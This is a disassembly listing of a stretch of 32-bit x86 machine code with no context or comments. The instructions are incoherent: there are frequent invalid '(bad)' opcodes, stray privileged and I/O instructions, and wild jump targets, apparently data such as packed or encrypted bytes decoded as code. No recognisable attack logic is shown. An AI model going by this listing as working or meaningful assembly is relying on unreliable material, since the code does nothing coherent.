  41684c:	cmp    eax,0x7d5204ae
  416851:	jle    0x4168ba
  416853:	jecxz  0x41688c
  416855:	jle    0x4168c5
  416857:	dec    esi
  416858:	pop    esp
  416859:	(bad)
  41685d:	inc    ebx
  41685e:	popa   
  41685f:	sub    ch,cl
  416861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416862:	test   DWORD PTR [eax-0x38592238],edx
  416868:	loope  0x4168c4
  41686a:	push   0x7c0649ec
  41686f:	stos   DWORD PTR es:[edi],eax
  416870:	outs   dx,BYTE PTR ds:[esi]
  416871:	neg    esp
  416873:	iret   
  416874:	mov    edi,gs
  416876:	pop    esi
  416877:	xor    esi,DWORD PTR [esi]
  416879:	sub    esp,eax
  41687b:	ficomp WORD PTR [ebp+0x6f]
  41687e:	retf   
  41687f:	test   ebx,eax
  416881:	test   ch,dl
  416883:	(bad)  
  416884:	pop    eax
  416885:	inc    edx
  416886:	pop    esi
  416887:	jb     0x41688a
  416889:	loope  0x4168ac
  41688b:	mov    eax,0x69c7bff5
  416890:	add    al,0xf5
  416892:	popa   
  416893:	ror    BYTE PTR [ebx-0x1a],1
  416896:	test   DWORD PTR [esi],ebp
  416898:	xchg   ebx,eax
  416899:	cli    
  41689a:	dec    esp
  41689b:	xor    bh,bl
  41689d:	jle    0x9606dd0b
  4168a3:	dec    eax
  4168a4:	or     al,BYTE PTR [ebx+0x2c33276a]
  4168aa:	mov    ch,0x81
  4168ac:	outs   dx,DWORD PTR ds:[esi]
  4168ad:	shr    DWORD PTR [edi],cl
  4168af:	das    
  4168b0:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168b2:	stc    
  4168b3:	mov    dl,ah
  4168b5:	and    BYTE PTR [esi+0x784e0989],ah
  4168bb:	or     dh,BYTE PTR [edi]
  4168bd:	mov    bh,0x23
  4168bf:	sbb    DWORD PTR [eax+0x212d8307],ebp
  4168c5:	sub    BYTE PTR [ebx-0xa],0x9a
  4168c9:	in     al,0xd5
  4168cb:	push   0xffffff86
  4168cd:	sub    dh,BYTE PTR [ebp+0x7505201e]
  4168d3:	in     eax,0xef
  4168d5:	pop    esi
  4168d6:	ins    DWORD PTR es:[edi],dx
  4168d7:	mov    edi,0xf693849
  4168dc:	sahf   
  4168dd:	test   ch,0xfb
  4168e0:	ret    
  4168e1:	sbb    ebp,DWORD PTR [edi+eiz*8+0x5339234f]
  4168e8:	out    dx,eax
  4168e9:	mov    ds:0x57a1415f,eax
  4168ee:	es iretw 
  4168f1:	f2xm1  
  4168f3:	test   eax,0x576d5fdd
  4168f8:	mov    al,BYTE PTR [ebx]
  4168fa:	(bad)  
  4168fb:	mov    bl,0xb0
  4168fd:	or     al,0x6b
  4168ff:	je     0x4168eb
  416901:	xor    ch,BYTE PTR [ebp-0x45]
  416904:	sbb    al,0x6c
  416906:	and    al,0x59
  416908:	dec    eax
  416909:	push   ebx
  41690a:	jae    0x4168fe
  41690c:	ret    0x6454
  41690f:	mov    al,ds:0x2da56c4d
  416914:	sti    
  416915:	pusha  
  416916:	repnz fxch st(6)
  416919:	das    
  41691a:	icebp  
  41691b:	xchg   edx,edi
  41691d:	jne    0x416943
  41691f:	imul   esi,DWORD PTR [edi-0x5b],0x8e0a4b87
  416926:	push   es
  416927:	push   ebp
  416928:	adc    dl,BYTE PTR [edi-0x4d]
  41692b:	in     eax,0xd9
  41692d:	rol    DWORD PTR [ebp-0x50],1
  416930:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416931:	inc    ecx
  416932:	adc    ebx,ecx
  416934:	cmp    DWORD PTR [ebx],esi
  416936:	rcr    BYTE PTR [ecx-0x1202b241],1
  41693c:	xchg   ecx,eax
  41693d:	mov    ds:0x39e9f995,eax
  416942:	cldemote BYTE PTR [eax+0x7a3176ad]
  416949:	cmp    dh,BYTE PTR [eax-0x7d]
  41694c:	aaa    
  41694d:	scas   al,BYTE PTR es:[edi]
  41694e:	leave  
  41694f:	jae    0x41692e
  416951:	mov    al,ds:0x32ac977f
  416956:	dec    ebx
  416957:	arpl   WORD PTR [ecx],bx
  416959:	test   DWORD PTR [eax],ecx
  41695b:	push   edx
  41695c:	inc    esi
  41695d:	xor    DWORD PTR [edi-0x3124e95e],eax
  416963:	lock cmp edi,DWORD PTR [ecx+0x16]
  416967:	mov    bh,0xd4
  416969:	mov    bh,0x48
  41696b:	test   eax,0x138fd621
  416970:	mov    WORD PTR [esi-0x35744a77],ss
  416976:	loop   0x41693e
  416978:	xchg   esp,eax
  416979:	mov    al,0x31
  41697b:	neg    ch
  41697d:	mov    esp,0x33eb49ea
  416982:	xor    eax,0xae8cd803
  416987:	call   0xc75402d9
  41698c:	sub    edx,0xffffffdf
  41698f:	stos   BYTE PTR es:[edi],al
  416990:	cmc    
  416991:	lea    edi,[ebp-0x4e80a24b]
  416997:	pminsw mm3,QWORD PTR [ebp+ecx*1-0x60]
  41699c:	inc    eax
  41699d:	sub    DWORD PTR [edi-0x299ba7ba],eax
  4169a3:	sub    ebp,edi
  4169a5:	mov    ah,0x0
  4169a7:	test   BYTE PTR [esi+0x2b96eb43],cl
  4169ad:	and    edi,ecx
  4169af:	arpl   WORD PTR [edi-0x77],ax
  4169b2:	(bad)  
  4169b4:	xchg   edi,eax
  4169b5:	cld    
  4169b6:	or     al,0x74
  4169b8:	pop    ss
  4169b9:	push   ds
  4169ba:	lock inc edx
  4169bc:	push   ss
  4169bd:	xchg   esi,eax
  4169be:	fnsetpm(287 only) 
  4169c0:	or     DWORD PTR [edx-0x60f168b],edi
  4169c6:	test   al,0x35
  4169c8:	add    eax,0x29aa77c5
  4169cd:	push   esp
  4169ce:	stos   BYTE PTR es:[edi],al
  4169cf:	xor    DWORD PTR [esi+0xd4c0d16],esi
  4169d5:	xchg   ecx,eax
  4169d6:	push   ebx
  4169d7:	aad    0x52
  4169d9:	fmul   DWORD PTR [eax+0x77]
  4169dc:	mov    al,ds:0xefc0992b
  4169e1:	pop    ss
  4169e2:	fnstenv [eax-0x5e694085]
  4169e8:	loop   0x416a20
  4169ea:	(bad)  
  4169eb:	and    DWORD PTR [edx+0x3ce22140],0xffffffa7
  4169f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169f3:	cmc    
  4169f4:	shl    bh,0x9c
  4169f7:	shr    BYTE PTR [edi],cl
  4169f9:	add    al,0x7c
  4169fb:	pop    eax
  4169fc:	ret    0xb16e
  4169ff:	add    bh,bh
  416a01:	jl     0x4169a8
  416a03:	or     edi,DWORD PTR [edx-0x3f]
  416a06:	xor    BYTE PTR [edi+0x5aac88c7],al
  416a0c:	fs pushf 
  416a0e:	lahf   
  416a0f:	or     ah,BYTE PTR [ecx+ecx*2+0x62]
  416a13:	add    ch,BYTE PTR [ebp-0x65b2676a]
  416a19:	xor    BYTE PTR [ebp-0x15f5e563],al
  416a1f:	pop    edi
  416a20:	ret    0x7145
  416a23:	mov    bl,0x12
  416a25:	dec    edx
  416a26:	dec    esp
  416a27:	ror    BYTE PTR [esi+0x752507f2],1
  416a2d:	rol    BYTE PTR [edi-0x5a],cl
  416a30:	xlat   BYTE PTR ds:[ebx]
  416a31:	jl     0x416aae
  416a33:	std    
  416a34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a35:	mov    ebp,0xc2c6019d
  416a3a:	add    DWORD PTR [eax+0x68],ebx
  416a3d:	or     BYTE PTR [eax+0x2cc9dfe0],bh
  416a43:	jg     0x416a9e
  416a45:	xor    al,0x72
  416a47:	std    
  416a48:	push   edi
  416a49:	mov    esi,0xf832c2b4
  416a4e:	nop
  416a4f:	es jl  0x416a68
  416a52:	adc    eax,0x7e967c82
  416a57:	les    edi,FWORD PTR [ecx-0x33e0fd40]
  416a5d:	or     al,BYTE PTR cs:[ebp-0x535b5b79]
  416a64:	iret   
  416a65:	xlat   BYTE PTR ds:[ebx]
  416a66:	jae    0x4169fc
  416a68:	inc    ebx
  416a69:	clc    
  416a6a:	xchg   edx,edi
  416a6c:	mov    ds:0xbf0dccbc,al
  416a71:	and    al,0x31
  416a73:	imul   edx,DWORD PTR [esi+ebx*8+0x58],0xffffffdc
  416a78:	mul    BYTE PTR [ecx-0x41]
  416a7b:	mov    ebp,0x4f3c402
  416a80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a81:	and    BYTE PTR [ebx],ah
  416a83:	icebp  
  416a84:	push   ss
  416a85:	hlt    
  416a86:	add    al,0x69
  416a88:	mov    edi,0x2bc41ed
  416a8d:	cdq    
  416a8e:	dec    ebp
  416a8f:	imul   ecx,DWORD PTR [edi+edx*4],0xb57ea686
  416a96:	add    BYTE PTR [ecx+0x818cbd2],dl
  416a9c:	sti    
  416a9d:	xchg   ecx,eax
  416a9e:	mov    ss,ebp
  416aa0:	sbb    al,0x79
  416aa2:	ret    
  416aa3:	push   ss
  416aa4:	gs jp  0x416a49
  416aa7:	shl    DWORD PTR [ebx+ebp*2-0x14],0x5b
  416aac:	adc    ebp,eax
  416aae:	sar    ebx,0xe
  416ab1:	sbb    cl,BYTE PTR es:[eax]
  416ab4:	js     0x416a66
  416ab6:	or     BYTE PTR [edi],ch
  416ab8:	mov    al,ds:0xa68e5e7d
  416abd:	loop   0x416b0a
  416abf:	sbb    DWORD PTR [edi],edi
  416ac1:	call   0x5cc76dee
  416ac6:	aam    0x75
  416ac8:	or     ebx,eax
  416aca:	test   al,0x3c
  416acc:	out    dx,eax
  416acd:	out    0x95,eax
  416acf:	xchg   esi,eax
  416ad0:	jbe    0x416a72
  416ad2:	enter  0xbecb,0x97
  416ad6:	retf   0xf003
  416ad9:	cmp    DWORD PTR [ebp+0x652f2467],ebx
  416adf:	cwde   
  416ae0:	cmp    BYTE PTR [esi+ecx*1+0x4d],ch
  416ae4:	add    edi,DWORD PTR [edi]
  416ae6:	imul   BYTE PTR [eax+ebx*1-0x21]
  416aea:	hlt    
  416aeb:	and    al,0x21
  416aed:	xor    BYTE PTR [ebp-0x324c9d30],0xc3
  416af4:	dec    esp
  416af5:	mov    al,ds:0xa6667c5f
  416afa:	in     eax,dx
  416afb:	add    BYTE PTR [ebx+ebp*1+0x17c0ea80],cl
  416b02:	and    ebx,DWORD PTR [edi-0x3304fa7]
  416b08:	leave  
  416b09:	mov    ds:0xeb887199,al
  416b0e:	jge    0x416b22
  416b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b11:	jl     0x416aa9
  416b13:	and    DWORD PTR [ecx-0x56ad702f],eax
  416b19:	enter  0x5510,0xf0
  416b1d:	sub    al,BYTE PTR [edi+0x51]
  416b20:	cmp    DWORD PTR [edx],eax
  416b22:	lock sbb dl,dh
  416b25:	jecxz  0x416b26
  416b27:	stos   BYTE PTR es:[edi],al
  416b28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b29:	mov    cl,0x10
  416b2b:	dec    eax
  416b2c:	in     al,dx
  416b2d:	in     al,dx
  416b2e:	pusha  
  416b2f:	je     0x416af2
  416b31:	in     eax,dx
  416b32:	pop    esp
  416b33:	inc    esp
  416b34:	shl    dl,1
  416b36:	ins    DWORD PTR es:[edi],dx
  416b37:	(bad)  
  416b38:	pop    ebx
  416b39:	jne    0x416b2a
  416b3b:	add    BYTE PTR [edi+0x23],dl
  416b3e:	dec    esp
  416b3f:	and    dh,BYTE PTR [edi]
  416b41:	data16 fisub WORD PTR [ebx+esi*1]
  416b45:	mov    eax,0x6d964f27
  416b4a:	pop    es
  416b4b:	adc    DWORD PTR [eax],esp
  416b4d:	fcomp  DWORD PTR [ebx]
  416b4f:	inc    edx
  416b50:	push   ebx
  416b51:	mov    fs,ebx
  416b53:	jp     0x416ba9
  416b55:	mov    bh,bl
  416b57:	cs xchg ebx,eax
  416b59:	fwait
  416b5a:	cli    
  416b5b:	cmc    
  416b5c:	dec    edi
  416b5d:	mov    dh,0x9b
  416b5f:	repnz mov ds:0xd4a008dc,eax
  416b65:	shl    DWORD PTR [ebp+0x39f70d78],0x2f
  416b6c:	mov    eax,ds:0xac2a1e9a
  416b71:	hlt    
  416b72:	pop    ds
  416b73:	pop    es
  416b74:	sti    
  416b75:	or     BYTE PTR [esi-0x28c5550c],dh
  416b7b:	test   BYTE PTR [ebx+0x1e],dl
  416b7e:	mov    ds:0xbeb06b66,al
  416b83:	icebp  
  416b84:	aam    0x1d
  416b86:	loopne 0x416b59
  416b88:	mov    edi,0xb9a46bb8
  416b8d:	pop    ebp
  416b8e:	xlat   BYTE PTR ds:[ebx]
  416b8f:	jg     0x416c05
  416b91:	nop
  416b92:	(bad)  
  416b93:	(bad)  
  416b94:	fld    DWORD PTR ds:0xee0d3b06
  416b9a:	dec    esp
  416b9b:	pop    ebp
  416b9c:	adc    eax,0xd794fcf3
  416ba1:	mov    dl,0xe6
  416ba3:	dec    ecx
  416ba4:	mov    ebp,0x311dae0f
  416ba9:	sub    al,0xfe
  416bab:	pop    eax
  416bac:	pop    ecx
  416bad:	xchg   BYTE PTR [ecx],ch
  416baf:	fst    st(5)
  416bb1:	ds inc esi
  416bb3:	ins    DWORD PTR es:[edi],dx
  416bb4:	aam    0x8c
  416bb6:	sti    
  416bb7:	pop    esi
  416bb8:	sbb    DWORD PTR [edi+eax*4+0x7346d166],edi
  416bbf:	fiadd  DWORD PTR [edx-0x66f64648]
  416bc5:	mov    al,0x4c
  416bc7:	adc    DWORD PTR [edi+0x2e],0x6f44552c
  416bce:	out    dx,al
  416bcf:	test   BYTE PTR [eax-0x4b],dl
  416bd2:	jne    0x416be0
  416bd4:	and    DWORD PTR [eax+ecx*1],eax
  416bd7:	fstp   DWORD PTR [eax-0x35e2133e]
  416bdd:	xchg   edx,eax
  416bde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bdf:	or     esp,DWORD PTR [ebx-0x18927b]
  416be5:	dec    ebx
  416be6:	(bad)  
  416be7:	in     eax,0x7b
  416be9:	inc    ax
  416beb:	and    BYTE PTR [ecx],dh
  416bed:	push   esp
  416bee:	sbb    eax,0x88c8da7e
  416bf3:	xor    BYTE PTR [ebx-0x51a92618],0x45
  416bfa:	mov    ah,0xc1
  416bfc:	cmp    DWORD PTR [eax],0xffffffec
  416bff:	xchg   ebx,eax
  416c00:	push   0x5d
  416c02:	jge    0x416bcf
  416c04:	and    BYTE PTR [edx-0x25607113],ch
  416c0a:	mov    edx,0x17bb8aa8
  416c0f:	out    dx,eax
  416c10:	jns    0x416c2e
  416c12:	ins    DWORD PTR es:[edi],dx
  416c13:	dec    ebx
  416c14:	inc    edx
  416c15:	adc    eax,DWORD PTR [esi]
  416c17:	repnz fldcw WORD PTR [edi+0x71]
  416c1b:	cmc    
  416c1c:	cs push 0xffffffe0
  416c1f:	rol    DWORD PTR [eax],1
  416c21:	mov    ecx,0x1caf6c71
  416c26:	test   eax,0xc9b99b71
  416c2b:	fsub   st(5),st
  416c2d:	ins    BYTE PTR es:[edi],dx
  416c2e:	mov    al,ds:0x9afc871b
  416c33:	add    esp,DWORD PTR [ebx+edx*8+0x5cfc7ffa]
  416c3a:	push   ebx
  416c3b:	sti    
  416c3c:	pop    ss
  416c3d:	fisttp QWORD PTR cs:[ebx+ecx*4-0x17]
  416c42:	pop    ds
  416c43:	pop    esi
  416c44:	mov    edi,0x3a7821c0
  416c49:	out    dx,al
  416c4a:	cmc    
  416c4b:	sahf   
  416c4c:	bound  ebx,QWORD PTR [edi+ebx*2+0x5535893c]
  416c53:	push   ss
  416c54:	inc    eax
  416c55:	jo     0x416cc1
  416c57:	int3   
  416c58:	test   eax,0xf8744b11
  416c5d:	loop   0x416c64
  416c5f:	gs pop esp
  416c61:	inc    edi
  416c62:	outs   dx,DWORD PTR ds:[esi]
  416c63:	in     eax,0x1a
  416c65:	jo     0x416cd7
  416c67:	(bad)  
  416c68:	or     eax,0xb06eace1
  416c6d:	ss mov ecx,ss
  416c70:	inc    ecx
  416c71:	es mov esp,0xb59e68ab
  416c77:	loope  0x416ce4
  416c79:	sbb    al,0x76
  416c7b:	or     edx,DWORD PTR [ecx+0x3a]
  416c7e:	daa    
  416c7f:	std    
  416c80:	xor    edi,DWORD PTR [ecx-0x39]
  416c83:	das    
  416c84:	sub    edi,esi
  416c86:	mov    dl,BYTE PTR [ecx]
  416c88:	jge    0x416c85
  416c8a:	push   edx
  416c8b:	cdq    
  416c8c:	sbb    eax,DWORD PTR [esi+0x2bf31f53]
  416c92:	push   cs
  416c93:	add    ch,BYTE PTR [ebp+0xa]
  416c96:	stc    
  416c97:	xor    DWORD PTR [eax-0x3d],edx
  416c9a:	dec    ebx
  416c9b:	sbb    eax,0x4dc6704f
  416ca0:	xchg   ecx,eax
  416ca1:	into   
  416ca2:	cmp    eax,0xc1454e98
  416ca7:	retf   0xb4c9
  416caa:	pushf  
  416cab:	sub    bl,BYTE PTR [ebx+0x42]
  416cae:	mov    ebp,0x3a2c3e55
  416cb3:	xor    edi,DWORD PTR [ebx-0x6e]
  416cb6:	dec    ecx
  416cb7:	xor    ecx,DWORD PTR [ebx]
  416cb9:	xor    al,dl
  416cbb:	test   al,0x2f
  416cbd:	mov    dl,0x7a
  416cbf:	add    dl,BYTE PTR [edi+esi*1]
  416cc2:	bound  edx,QWORD PTR [esi+0x424095b9]
  416cc8:	push   ebx
  416cc9:	sub    BYTE PTR [edi+0x61f8818a],dl
  416ccf:	inc    eax
  416cd0:	pop    ebx
  416cd1:	(bad)  
  416cd2:	sub    al,0xbb
  416cd4:	jne    0x416c61
  416cd6:	xchg   edx,eax
  416cd7:	sub    DWORD PTR [esi-0xe],ebx
  416cda:	or     ecx,DWORD PTR [ecx+0x3babde2a]
  416ce0:	add    BYTE PTR [ebx],al
  416ce2:	dec    esp
  416ce3:	repnz push es
  416ce5:	gs in  eax,dx
  416ce7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ce8:	stos   DWORD PTR es:[edi],eax
  416ce9:	sbb    ch,dl
  416ceb:	mov    BYTE PTR [esp+ebx*1-0x4],dl
  416cef:	mov    bh,0xa0
  416cf1:	rcr    DWORD PTR [edx-0x31],cl
  416cf4:	test   al,0x97
  416cf6:	fdivr  DWORD PTR [esi+ebx*4-0x79]
  416cfa:	sub    al,0xe
  416cfc:	les    ebp,FWORD PTR [eax]
  416cfe:	dec    edi
  416cff:	int    0xc0
  416d01:	push   edx
  416d02:	retf   
  416d03:	mov    al,BYTE PTR [edi-0x2f]
  416d06:	iret   
  416d07:	shl    BYTE PTR [esp+edi*2-0x5b],cl
  416d0b:	xchg   DWORD PTR [esi],esi
  416d0d:	cmp    BYTE PTR [ebp+0x20b7289a],ah
  416d13:	adc    DWORD PTR [edi-0x22],ebp
  416d16:	(bad)  [edi]
  416d18:	xchg   edx,eax
  416d19:	stos   DWORD PTR es:[edi],eax
  416d1a:	sub    ebp,edx
  416d1c:	lea    esi,[ecx]
  416d1e:	jno    0x416d98
  416d20:	ror    ebx,1
  416d22:	jg     0x416d53
  416d24:	packsswb mm0,mm6
  416d27:	mov    eax,0xdf8c1d43
  416d2c:	jge    0x416d95
  416d2e:	js     0x416d11
  416d30:	push   esp
  416d31:	xor    ebx,DWORD PTR [ebp-0x2b575b3c]
  416d37:	fcomp  st(0)
  416d39:	adc    al,0xa0
  416d3b:	cs ret 0xd974
  416d3f:	jmp    0x3edb:0xdf8d5f62
  416d46:	add    bh,BYTE PTR [eax-0x48]
  416d49:	leave  
  416d4a:	and    al,0xe5
  416d4c:	sbb    DWORD PTR [ebp+esi*4+0x75],ebp
  416d50:	xor    dh,bh
  416d52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d53:	push   esi
  416d54:	xor    dh,dh
  416d56:	imul   esp,DWORD PTR [ecx],0xeeff1f64
  416d5c:	fistp  QWORD PTR [ebx+0x1309f0ed]
  416d62:	sub    cl,ch
  416d64:	test   BYTE PTR [edx],bh
  416d66:	aad    0x7
  416d68:	ins    DWORD PTR es:[edi],dx
  416d69:	jbe    0x416dac
  416d6b:	mov    al,BYTE PTR [ebx+0x24e2c559]
  416d71:	and    BYTE PTR [ebp+0x4b10517a],0x3b
  416d78:	out    0x6d,eax
  416d7a:	mov    dh,0x52
  416d7c:	inc    eax
  416d7d:	loope  0x416dd9
  416d7f:	sub    cl,BYTE PTR ds:[edi-0x3628797b]
  416d86:	dec    DWORD PTR [eax]
  416d88:	pushf  
  416d89:	pushf  
  416d8a:	push   esi
  416d8b:	mov    cl,0x6
  416d8d:	retf   
  416d8e:	enter  0x4a6a,0x9e
  416d92:	mov    bh,BYTE PTR [ecx]
  416d94:	sbb    ch,BYTE PTR [ebp*2-0x70e8f666]
  416d9b:	cmp    al,0xdf
  416d9d:	js     0x416dc3
  416d9f:	xor    DWORD PTR [ecx],0x4fd0eb99
  416da5:	mov    cl,0xc6
  416da7:	jmp    0x56c1:0x8cf9985c
  416dae:	rol    DWORD PTR [esi+0x3eca3712],cl
  416db4:	sbb    DWORD PTR [edx+0x3a],edi
  416db7:	cmp    DWORD PTR [edi],eax
  416db9:	lods   al,BYTE PTR ds:[esi]
  416dba:	pop    ss
  416dbb:	dec    ebx
  416dbc:	push   ecx
  416dbd:	sbb    ecx,DWORD PTR [ebx]
  416dbf:	cmp    ebp,DWORD PTR [ebx+eax*1+0x71]
  416dc3:	fld    TBYTE PTR [edx]
  416dc5:	add    BYTE PTR [ebx],ch
  416dc7:	cwde   
  416dc8:	ins    BYTE PTR es:[edi],dx
  416dc9:	rcr    DWORD PTR [ecx+0x451de1d4],1
  416dcf:	jmp    0x416e13
  416dd1:	retf   0x7288
  416dd4:	and    DWORD PTR ds:0x8e085d9d,0xed7dbae1
  416dde:	inc    esp
  416ddf:	jle    0x416e24
  416de1:	scas   eax,DWORD PTR es:[edi]
  416de2:	xor    bh,bl
  416de4:	sub    BYTE PTR [edi-0x67eac3ce],al
  416dea:	fs jbe 0x416ddf
  416ded:	mov    BYTE PTR [ebx-0x2d],ah
  416df0:	repz jne 0x416e3b
  416df3:	fld    QWORD PTR [esi-0x799de456]
  416df9:	mov    ds:0xafc49271,eax
  416dfe:	sbb    al,0x7
  416e00:	sahf   
  416e01:	fs enter 0xbf2,0xfe
  416e06:	mov    ah,0xd9
  416e08:	int    0x45
  416e0a:	imul   eax,DWORD PTR [esi-0x5eefe1b7],0x62
  416e11:	retf   0x5d51
  416e14:	fadd   st(7),st
  416e16:	pop    es
  416e17:	adc    ebp,edx
  416e19:	jns    0x416dcf
  416e1b:	(bad)  
  416e1c:	xor    al,0xfe
  416e1e:	int    0x5d
  416e20:	ins    BYTE PTR es:[edi],dx
  416e21:	add    DWORD PTR [ecx+0x68],ebp
  416e24:	ror    DWORD PTR [ebx-0x6f7277d4],cl
  416e2a:	mov    bh,0xd6
  416e2c:	xchg   esi,eax
  416e2d:	icebp  
  416e2e:	ss jnp 0x416ea6
  416e31:	adc    BYTE PTR [eax+0xc],bh
  416e34:	xor    al,0x75
  416e36:	rcl    BYTE PTR [ebx+0x47f256fa],cl
  416e3c:	xchg   ecx,eax
  416e3d:	xchg   DWORD PTR [edi+0x49],esi
  416e40:	pop    esp
  416e41:	hlt    
  416e42:	xlat   BYTE PTR ds:[ebx]
  416e43:	ror    DWORD PTR [esi],0x4f
  416e46:	(bad)  
  416e48:	pop    ebx
  416e49:	mov    ebp,0x413a0ac0
  416e4e:	stos   BYTE PTR es:[edi],al
  416e4f:	inc    esi
  416e50:	push   edi
  416e51:	into   
  416e52:	frstor [ecx+ebp*2-0x21]
  416e56:	cwde   
  416e57:	(bad)  
  416e58:	mov    eax,cs
  416e5a:	jecxz  0x416de6
  416e5c:	aas    
  416e5d:	or     BYTE PTR [ecx-0x59fe083d],ch
  416e63:	in     eax,dx
  416e64:	dec    ebp
  416e65:	push   es
  416e66:	push   esi
  416e67:	dec    ebp
  416e68:	pop    ecx
  416e69:	in     eax,0x23
  416e6b:	xchg   ebx,eax
  416e6c:	enter  0x67ac,0x34
  416e70:	cwde   
  416e71:	ret    0x8576
  416e74:	pop    ds
  416e75:	aad    0x37
  416e77:	aad    0x88
  416e79:	retf   
  416e7a:	jmp    0x643f6ba5
  416e7f:	outs   dx,BYTE PTR ds:[esi]
  416e80:	daa    
  416e81:	retf   0xe261
  416e84:	and    ah,BYTE PTR [ecx+eiz*4+0x2d4a17d6]
  416e8b:	xor    al,0x67
  416e8d:	xchg   dh,bl
  416e8f:	add    ebp,0xebfc4c61
  416e95:	xor    eax,0x849cc5ec
  416e9a:	dec    ebx
  416e9b:	ror    dh,cl
  416e9d:	sti    
  416e9e:	enter  0x9528,0xec
  416ea2:	lea    esp,[ecx-0x6ad51e33]
  416ea8:	mov    cl,0x2f
  416eaa:	(bad)  
  416eab:	xchg   sp,ax
  416ead:	ret    0x6e96
  416eb0:	mov    eax,ds:0xe5612e69
  416eb5:	xchg   esp,eax
  416eb6:	inc    eax
  416eb7:	pop    ebx
  416eb8:	sbb    eax,0xc9532852
  416ebd:	xchg   DWORD PTR [edi+0x12],esi
  416ec0:	jnp    0x416e52
  416ec2:	or     al,0x24
  416ec4:	pusha  
  416ec5:	xchg   esi,eax
  416ec6:	adc    BYTE PTR [eax+ecx*4-0x1d72d3c3],bl
  416ecd:	xor    eax,0xed216c07
  416ed2:	push   ebp
  416ed3:	ss retf 
  416ed5:	mov    eax,ds:0xcd8a48fc
  416eda:	(bad)
  416edd:	sti    
  416ede:	dec    esi
  416edf:	ins    DWORD PTR es:[edi],dx
  416ee0:	dec    ebp
  416ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ee2:	dec    ebx
  416ee3:	sbb    eax,0x69f6fe4b
  416ee8:	mov    ebx,0xfc676677
  416eed:	mov    ecx,0x8d17dd44
  416ef2:	cwde   
  416ef3:	or     eax,0x95946849
  416ef8:	shr    DWORD PTR [esi-0x6f],cl
  416efb:	inc    esi
  416efc:	fst    QWORD PTR [eax]
  416efe:	xchg   ecx,eax
  416eff:	and    BYTE PTR [edi-0x4b],ch
  416f02:	je     0x416ee8
  416f04:	scas   al,BYTE PTR es:[edi]
  416f05:	push   0xffffffc8
  416f07:	add    eax,DWORD PTR [esi+0x21]
  416f0a:	dec    edx
  416f0b:	push   ds
  416f0c:	xor    DWORD PTR [edi],edx
  416f0e:	push   ebp
  416f0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f10:	aas    
  416f11:	add    ch,BYTE PTR [eax-0x4c]
  416f14:	stos   BYTE PTR es:[edi],al
  416f15:	and    bl,BYTE PTR [esi+0x4a9de366]
  416f1b:	ret    
  416f1c:	or     al,0x36
  416f1e:	int    0xd3
  416f20:	xchg   esp,eax
  416f21:	(bad)  
  416f23:	dec    ebx
  416f24:	pop    edi
  416f25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f26:	outs   dx,BYTE PTR ds:[esi]
  416f27:	mov    ecx,0xc078cdd
  416f2c:	jp     0x416edc
  416f2e:	jg     0x416f24
  416f30:	retf   
  416f31:	adc    eax,0xfb6e9b30
  416f36:	adc    DWORD PTR [ebx+0x454d8a48],ebx
  416f3c:	xchg   ebp,eax
  416f3d:	retf   0xb2
  416f40:	push   ss
  416f41:	aas    
  416f42:	fbld   TBYTE PTR [eax+eax*2+0x7c]
  416f46:	(bad)  
  416f47:	mov    ch,0xc3
  416f49:	jle    0x416edc
  416f4b:	and    BYTE PTR [ecx-0x4f],cl
  416f4e:	(bad)  
  416f50:	mov    WORD PTR [ecx+0x35],ds
  416f53:	fmul   DWORD PTR [edi-0x62b959e8]
  416f59:	adc    al,0xd
  416f5b:	cmp    ch,BYTE PTR [ecx+0x1362a671]
  416f61:	mov    BYTE PTR [ebp+0x11],0x20
  416f65:	add    ebp,esp
  416f67:	inc    ecx
  416f68:	rcl    DWORD PTR [ebp-0x74946587],0x68
  416f6f:	fcmovnb st,st(0)
  416f71:	(bad)  
  416f72:	adc    bh,BYTE PTR [edi+0x1f95e7bc]
  416f78:	and    cl,0x73
  416f7b:	mov    ch,0xf0
  416f7d:	push   ebp
  416f7e:	js     0x416f27
  416f80:	sti    
  416f81:	lock test BYTE PTR [ebx+eiz*1],ch
  416f85:	xchg   DWORD PTR [eax-0x30],esi
  416f88:	push   ss
  416f89:	inc    eax
  416f8a:	push   esi
  416f8b:	jmp    0xa3ad:0xd7b75e1
  416f92:	leave  
  416f93:	push   edi
  416f94:	sbb    al,0x29
  416f96:	add    BYTE PTR [ebx-0x5884a932],cl
  416f9c:	push   eax
  416f9d:	pop    ebx
  416f9e:	inc    ebp
  416f9f:	mov    esi,0xc3282f89
  416fa4:	xor    al,al
  416fa6:	scas   al,BYTE PTR es:[edi]
  416fa7:	mov    ds:0x87d6cec,eax
  416fac:	aad    0x7e
  416fae:	lds    esp,FWORD PTR [edi]
  416fb0:	jns    0x416fd6
  416fb2:	mov    WORD PTR [eax-0x557d359d],ss
  416fb8:	xor    BYTE PTR [ecx],0x37
  416fbb:	cmc    
  416fbc:	fiadd  DWORD PTR [ebx]
  416fbe:	cmp    ch,BYTE PTR [edi]
  416fc0:	push   cs
  416fc1:	dec    edi
  416fc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fc3:	or     BYTE PTR [edi-0x615efb21],0x18
  416fca:	jb     0x417014
  416fcc:	pop    eax
  416fcd:	test   BYTE PTR [edi-0x5193e593],0x9f
  416fd4:	mov    dh,0xe4
  416fd6:	add    edi,DWORD PTR ss:[edx-0x31]
  416fda:	jnp    0x41700e
  416fdc:	push   edi
  416fdd:	pop    ebp
  416fde:	mov    DWORD PTR ds:0x5cde8021,esp
  416fe4:	xchg   BYTE PTR [esi-0x69],dh
  416fe7:	(bad)  
  416fe9:	and    BYTE PTR [ecx+0x41bc6933],dh
